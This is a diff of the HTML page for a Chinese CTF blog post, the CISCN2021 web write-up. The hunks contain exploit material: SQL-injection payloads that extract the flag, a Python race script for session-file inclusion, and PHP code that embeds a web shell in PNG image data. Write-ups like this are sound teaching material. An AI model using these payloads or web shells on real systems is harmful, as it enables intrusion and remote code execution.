@@ -8,17 +8,17 @@
         <title>CISCN2021 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="CISCN2021 Writeup" />
 <meta property="og:description" content="CISCN2021 Web 部分Writeup" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/ciscn2021_writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/ciscn2021_writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-05-18T23:55:52+08:00" />
 <meta property="article:modified_time" content="2021-05-18T23:55:52+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="CISCN2021 Writeup"/>
 <meta name="twitter:description" content="CISCN2021 Web 部分Writeup"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/ciscn2021_writeup/" /><link rel="prev" href="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" /><link rel="next" href="https://clq0.top/golang_scan_tech/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/ciscn2021_writeup/" /><link rel="prev" href="https://blog.h4ck.fun/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" /><link rel="next" href="https://blog.h4ck.fun/golang_scan_tech/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/ciscn2021_writeup\/"
-        },"genre": "posts","keywords": "RCE, LFI, XSSearch","wordcount":  2323 ,
-        "url": "https:\/\/clq0.top\/ciscn2021_writeup\/","datePublished": "2021-05-18T23:55:52+08:00","dateModified": "2021-05-18T23:55:52+08:00","publisher": {
+            "@id": "https:\/\/blog.h4ck.fun\/ciscn2021_writeup\/"
+        },"genre": "posts","keywords": "RCE, LFI, XSSearch","wordcount":  2315 ,
+        "url": "https:\/\/blog.h4ck.fun\/ciscn2021_writeup\/","datePublished": "2021-05-18T23:55:52+08:00","dateModified": "2021-05-18T23:55:52+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">CISCN2021 Writeup</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-18">2021-05-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2323 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-18">2021-05-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2315 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id="/ciscn2021_writeup/" class="leancloud_visitors" data-flag-title="CISCN2021 Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
@@ -132,10 +132,10 @@
 <p>提交参数：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
 </code></pre></td></tr></table>
 </div>
 </div><p>爆破rb的值a-z，在q得到flag：</p>
@@ -169,7 +169,7 @@
 <p>一开始用按位比较：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -189,7 +189,7 @@
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.35.238:23511/&#39;</span>
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
@@ -205,7 +205,7 @@
         <span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
         <span class="k">if</span> <span class="s1">&#39;login&lt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
             <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
             <span class="k">break</span>
 </code></pre></td></tr></table>
 </div>
@@ -220,7 +220,7 @@
         title="https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -230,13 +230,13 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
 </span><span class="s1">//Duplicate column name &#39;</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="s1">&#39;
 </span><span class="s1">
-</span><span class="s1">admin&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="o">`</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="o">`</span> <span class="k">from</span> <span class="k">security</span><span class="p">.</span><span class="n">flag</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)))</span><span class="o">#</span>
-<span class="o">//</span><span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&#39;</span>
-
-<span class="k">admin</span><span class="s1">&#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
+</span><span class="s1">admin&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="o">`</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="o">`</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">security</span><span class="p">.</span><span class="n">flag</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)))</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">admin</span><span class="s1">&#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
 </span><span class="s1">//XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">uFWI</span><span class="o">-</span><span class="err">}</span><span class="o">~</span><span class="s1">&#39;
 </span></code></pre></td></tr></table>
 </div>
@@ -259,7 +259,7 @@
 <p>exp：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -302,7 +302,7 @@
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">threading</span>
 
 <span class="c1">#file_content = &#39;&lt;?php print_r(scandir(&#34;/etc&#34;));?&gt;&#39;</span>
@@ -314,8 +314,8 @@
 <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">POST</span><span class="p">():</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="nb">file</span><span class="o">=</span><span class="p">{</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">file</span><span class="o">=</span><span class="p">{</span>
             <span class="s2">&#34;upload&#34;</span><span class="p">:(</span><span class="s1">&#39;&lt;?php echo 999;?&gt;&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span>
         <span class="p">}</span>
         <span class="n">data</span><span class="o">=</span><span class="p">{</span>
@@ -324,16 +324,16 @@
         <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
             <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="s1">&#39;PHPSESSID=1234&#39;</span>
         <span class="p">}</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="nb">file</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">file</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">READ</span><span class="p">():</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
         <span class="n">event</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
         <span class="n">t</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://124.70.35.238:23579/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234&#39;</span><span class="p">})</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2230</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+]retry&#39;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+]retry&#39;</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
             <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
 <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
 <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
@@ -358,11 +358,11 @@
 <p>第一个点，绕<code>getimagesize</code>函数获取的长宽限制，文件中只要包含：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">#define width 1
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#define width 1
 #define height 1
 </code></pre></td></tr></table>
 </div>
@@ -379,7 +379,7 @@
 <p>或者根据IDAT块的转换算法，直接向IDAT块中写入转换前的数据，经过<code>imagecreatefrompng</code>重载后，生成的新图片中出现了可以利用的恶意代码，网上找的exp，有兴趣的可以自己调一调，内容为<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -405,7 +405,7 @@
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
            <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
            <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
@@ -428,8 +428,8 @@
 <span class="p">}</span>
  
 <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>了解这三点后，直接进行利用：</p>
 <p>因为在比赛中，测试发现PLTE块还是被一定程度的改变，直接用上文的exp写IDAT块，但是题目ban了一堆函数，加上<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>只能单参数执行，并不能拿到flag，所以打算直接静态探究一下PLTE块被转换的规律：</p>
@@ -481,10 +481,10 @@
 <p>最后需要<code>/*</code>或者<code>?&gt;</code>注释剩余字符或者闭合都行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">.\poc_png.py -p &#34;*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+&#34; -o test1.txt .\indexcolor.png
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.\poc_png.py -p &#34;*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+&#34; -o test1.txt .\indexcolor.png
 </code></pre></td></tr></table>
 </div>
 </div><p>按上述步骤上传解压后，成功写入一句话：</p>
@@ -515,7 +515,7 @@
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/ciscn2021_writeup/" data-title="CISCN2021 Writeup" data-hashtags="RCE,LFI,XSSearch"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/ciscn2021_writeup/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/ciscn2021_writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/ciscn2021_writeup/" data-title="CISCN2021 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/ciscn2021_writeup/" data-title="CISCN2021 Writeup" data-via="Le0nsec" data-hashtags="RCE,LFI,XSSearch"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/ciscn2021_writeup/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/ciscn2021_writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/ciscn2021_writeup/" data-title="CISCN2021 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -534,7 +534,7 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
